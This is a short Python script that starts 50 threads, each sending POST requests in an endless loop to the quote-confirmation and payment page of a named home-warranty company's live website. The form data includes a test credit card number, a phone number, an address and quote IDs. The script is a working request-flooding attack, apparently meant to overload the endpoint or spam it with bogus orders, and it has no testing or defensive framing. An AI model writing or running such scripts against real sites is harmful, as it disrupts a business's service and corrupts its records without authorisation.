import requests
import threading

url='https://www.choicehomewarranty.com/get-a-quote/confirm.php'

req_obj={
    "Bcode": "email50",
    "status": "Customer",
    "home_phone": "5854063161",
    "ac": "3",
    "Azip": "14216",
    "quote_id": "6314010",
    "id": "15234723",
    "Aemail": "test@gmail.com",
    "ptype": "y",
    "lp_phone": "1-888-531-5403",
    "utm_source": "spdlfm",
    "ptype_mobile": "y",
    "payment-option": "Single+Payment",
    "Bcard_number": "4111111111111111",
    "exp_month": "05",
    "exp_year": "23",
    "Baddress": "13+test+ave",
    "Bcity": "BUFFALO",
    "Bstate": "NY",
    "Bzip": "14216",
    "agree": "on",
    "ptype_lg": "y"
}

# response = requests.post(url, data=req_obj).text

# print(response)

def do_requests():
    while True:
        response = requests.post(url, data=req_obj).text
        print(response)

threads = []

for i in range(50):
    t = threading.Thread(target=do_requests)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()